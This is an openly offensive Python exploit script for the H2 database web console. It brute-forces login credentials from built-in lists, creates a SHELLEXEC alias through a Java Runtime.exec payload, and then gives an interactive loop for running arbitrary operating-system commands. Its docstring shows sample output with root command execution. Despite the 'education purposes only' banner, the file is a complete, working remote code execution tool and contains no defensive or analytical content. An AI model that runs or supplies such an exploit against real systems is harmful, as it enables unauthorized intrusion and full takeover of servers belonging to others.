#!/usr/bin/env python 

import requests,sys

"""
https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html
Based off the code from searchsploit exploits/java/local/44422.py

rewritten it to continously get commands without needing to continuously 
resend payload.

==========================================================================================================================
==========================================================================================================================
THIS IS FOR EDUCATION PURPOSES ONLY. PLEASE DO NOT USE THIS ON ANY REAL SYSTEMS AROUND YOU AND DONT EVEN THINK ABOUT IT.
PLEASE BE RESPONSIBLE AND ETHICAL. BE REMINDED THAT IF YOU ARE CAUGHT, YOU WILL BE IN GRAVE TROUBLE.
==========================================================================================================================
==========================================================================================================================

If localhost is used via SSH port forwarding, the url for H2 Database must include http://localhost:XXXX where XXXX is the port number\

usernames and passwords list are provided in case we do not know the password and wishes to bruyteforce it.
Edit if you wanna use a wordlist

Once credentials are confirmed then a setup payload is used to initialize the function for executing scripts
In this case, when we input command after the setup payload is sent, a query to CALL SHELLEXEC(WHATEVERCOMMAND) will output to you the
values.


TO EXIT  GRACEFULLY, JUST TYPE    "EXIT"


EXAMPLE : 

root@kali:~# python drupalExploit.py 
[*] Start Exploiting outdated H2 ? 
[*] Press any key to Continue ...
[*] Enter url for the database : http://localhost:8113
[*] Testing for credentials ... 
[*] Obtaining new jsessionId ...
locationref : login.jsp?jsessionid=c5e0ef021f98c37328803e6c9f777e65
jsessionid : c5e0ef021f98c37328803e6c9f777e65
[*] Testing username : sa , password : 12345
===================================================================
Attempt to connect to  http://localhost:8113/login.do?jsessionid=c5e0ef021f98c37328803e6c9f777e65

[+] Credentials found!

USERNAME : sa
PASSWORD : 12345


================================================================


[+] LOGGED IN SUCCESSFULLY
[+] Credentials Confirmed!


[*] Preparing to send payload ... 
[*] Setting up payload : ... 
[+] Query URL : http://localhost:8113/query.do?jsessionid=c5e0ef021f98c37328803e6c9f777e65
[*] Sending Payload To Setup ...
[+] Attempt for payload setup done
Enter command --> id
call SHELLEXEC('id')
[*]Executing id

=========================================

id

 uid=0(root) gid=0(root) groups=0(root)

=========================================



Enter command --> EXIT
Stopping Exploitation ... 

"""

print("[*] Start Exploiting outdated H2 via Alias ... ")


# THE FOLLOWING USERNAMES AND PASSWORDS LIST ARE FOR YOU TO USE AS A WAY TO BRUTEFORCE
# IF THE USERNAME AND PASSWORDS ARE KNOWN THEN USE IT AS THE FIRST ITEM IN THE LIST
usernames = ["sa","admin","www-data"]
passwords = ["admin","password"]

#INCLUDE THE HTTP:// IN FRONT IF LOCALHOST
h2URL = str(raw_input("[*] Enter url for the database : "))

# PLEASE BE RESONSIBLE
foo = raw_input("PLEASE BE RESPONSIBLE ... PRESS ENTER TO CONTINUE ...")

# STARTING THE TESTING FOR CREDENTIALS BRUTEFORCING
print("[*] Testing for credentials ... ")
for user in usernames:
	for password in passwords:
		print("[*] Obtaining new jsessionId ...")
		r = requests.get(h2URL)
		response = r.text
		locationref = r.text.split("href = '")[1].split("';")[0]
		#print("locationref : " + locationref)

		# FILTERING THE JSESSIONID
		jsessionid = locationref.split("=")[1]
		print("jsessionid : " + jsessionid)
		print("[*] Testing username : " + user + " , password : " + password)
		print("===================================================================")

		# CHANGE THE PARAMETERS WHEREVER NEEDED ESPECIALLY THE URL KEY IN THE PARAMETER DISCTIONARY !!!!!!!!!!!!!!!!
		parameters = {"language":"en","setting":"Generic+H2+(Embedded)","name":"Generic+H2+(Embedded)","driver":"org.h2.Driver","url":"jdbc:h2:~/drupal","user":user,"password":password}
		linkToH2 = h2URL

		#Modify the URL for successful login
		linkToH2 += locationref.replace("login.jsp","/login.do")
		print("Attempt to connect to  " + linkToH2 + "\n")
		r = requests.post(linkToH2,data=parameters)
		response = r.text
		if "<th class=\"login\">Login</th>" in response:
			print("[-] Credential is not correct ... \n\n")
		elif "No Javascript" in response:
			print("[-] Failed ... No Javascript!")
			sys.exit(0)
		else:
			print("[+] Credentials found!\n\nUSERNAME : " + user + "\nPASSWORD : " + password + "\n\n\n================================================================\n\n")

			print("[+] LOGGED IN SUCCESSFULLY")
			break
	if not ("<th class=\"login\">Login</th>" in r.text):
		break
print("[+] Credentials Confirmed!")

print("\n[*] Preparing to send payload ... ")
print("[*] Setting up payload : ... ")
setupPayload='CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;'
param = {"sql":setupPayload}
#print(param)

# Modify the url for running a query
queryURL = h2URL + locationref.replace("login.jsp","/query.do")
print("[+] Query URL : " + queryURL)
print("[*] Sending Payload To Setup ...")
r = requests.post(queryURL,data=param)
#print r.text
print("[+] Attempt for payload setup done")
cmd = ""

#LOOP THE FUNCTION REQUEST SINCE ALIAS HAS BEEN CREATED FOR THE SHELL EXECUTION
while "EXIT" not in cmd:

	cmd = str(raw_input("Enter command --> "))
	if "EXIT" in cmd:
		print "Stopping Exploitation ... "
		sys.exit(0)
	execute = "call SHELLEXEC('" + cmd + "')"
	print(execute)
	print("[*]Executing " + cmd)
	param = {"sql":execute}
	r = requests.post(queryURL,data=param)
	if "Syntax error" in r.text:
		print "Syntax ERROR ..."
	else:
		try:
			#print r.text
			output = r.text.split("<tr><td>")[1].split("<br /></td>")[0]
			print("=========================================\n\n"+ cmd + "\n\n " + output + "\n\n=========================================\n\n")
		except:
			#output = r.text
			#print("=========================================\n\n"+ cmd + "\n\n " + output + "\n\n=========================================\n\n")
			print("This will cause error.")
